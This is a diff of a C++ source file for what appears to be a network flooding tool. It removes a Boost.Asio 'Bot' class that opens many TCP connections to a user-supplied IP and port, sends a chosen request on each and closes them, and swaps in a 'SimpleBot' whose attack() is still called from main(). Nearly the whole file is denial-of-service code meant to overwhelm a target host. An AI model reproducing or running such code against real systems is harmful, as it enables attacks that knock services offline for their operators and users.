@@ -1,140 +1,15 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-#include "Bot1.h"
-#include <iostream>
-#include <thread>
-#include "vector"
-#include "string"
-
-#include "boost/system/error_code.hpp"
-#include <boost/thread/thread.hpp>
-#include <boost/bind.hpp>
-#include <boost/functional.hpp>
-
+#include "SimpleBot.h"
+#include <boost/timer/timer.hpp>
 
 const int DELAY = 5;
 
-//using namespace boost::asio;
-typedef boost::shared_ptr<ip::tcp::socket> socket_ptr;
-
-boost::mutex data_mut;
-boost::mutex io_mutex;
-boost::condition_variable cond_var;
-bool ready_socket = false;
-
-
-class Bot{
-private:
-    io_service service;
-    ip::tcp::endpoint ep;
-    //ip::tcp::acceptor acc;
-    size_t NUMBER_OF_THREADS = 4;
-
-    void run(){
-        for(size_t i=0; i<this->socket_number; ++i) {
-            socket_ptr sock(new ip::tcp::socket(this->service));
-            connect(sock);
-        }
-        this->service.run();
-    }
-
-    void connect(socket_ptr sock){
-        sock.get()->async_connect(this->ep,
-                                  [this, sock](const boost::system::error_code& ec)
-                                  {
-                                      handle_connect(ec, sock);
-                                  });
-    }
-
-    void handle_connect(const boost::system::error_code& ec, socket_ptr sock){
-        if (!ec) {
-            size_t bytes_tr;
-            sock.get()->async_write_some(buffer(this->request),
-                                         [this, sock](const boost::system::error_code& ec, size_t bytes_trans)
-                                        {
-                                            handle_write(ec, bytes_trans, sock);
-                                        }   );
-            //write(*sock, buffer(this->request));
-        }else{
-            std::cerr << ec.message() << std::endl;
-        }
-
-    }
-
-    void handle_write(const boost::system::error_code& ec, size_t bytes_trans, socket_ptr sock){
-        if (!ec) {
-            std::cout <<"Success" << std::endl;
-            std::string response;
-            sock.get()->close();
-            //sock.get()->async_read_some(buffer(response), bind(&Bot::handle_read, this, ec, sock));
-        }else{
-            std::cerr << ec.message() << std::endl;
-        }
-    }
-
-    void handle_read(boost::system::error_code& ec, socket_ptr sock){
-        if (!ec){
-            sock.get()->close();
-        }
-    }
-
-public:
-    ip::address target;
-    size_t port;
-    std::string request;
-    size_t socket_number;
-
-    Bot(char* target, char* port, char* request, char* socket_number){
-        this->target = ip::address::from_string(target);;
-        this->port = (size_t)atoi(port);
-        this->ep = ip::tcp::endpoint(this->target, this->port);
-        this->request = std::string(request);
-        this->socket_number = (size_t)atoi(socket_number);
-    }
-
-    void attack(){
-        std::vector<boost::thread> threads;
-        for (size_t i=0; i<this->NUMBER_OF_THREADS; ++i){
-            run();
-        }
-        boost::this_thread::sleep( boost::posix_time::millisec(500));
-    }
-
-
-};
-
-void sock_connect(socket_ptr sock, ip::tcp::endpoint &ep) {
-    sock->connect(ep);
-    //boost::lock_guard<boost::mutex> lg(io_mutex);
-    //ready_socket = true;
-    //cond_var.notify_one();
-    boost::this_thread::sleep_for(boost::chrono::milliseconds(DELAY));
-}
-
-void my_write(socket_ptr sock_, std::string msg, ip::address &addr) {
-    try {
-//        boost::unique_lock<boost::mutex> lck(data_mut);
-//        cond_var.wait(lck, [] { return ready_socket; });
-//
-//        boost::lock_guard<boost::mutex> lg(io_mutex);
-//        ready_socket = false;
-        //boost::lock_guard<boost::mutex> lg(data_mut);
-        size_t res = sock_->write_some(buffer(msg));
-        boost::this_thread::sleep_for(boost::chrono::milliseconds(DELAY));
-    } catch (boost::system::system_error &e) {
-        e.what();
-        //return (size_t) -1;
-    }
-}
-
-void hello(int a, std::string s, socket_ptr sock) {}
-
 int main(int argc, char *argv[]) {
-    Bot bot(argv[1], argv[2], argv[3], argv[4]);
+    SimpleBot bot(argv[1], argv[2], argv[3], argv[4]);
+    boost::timer::auto_cpu_timer timer;
     bot.attack();
-
-
 
 
 //    char *URL = argv[1];
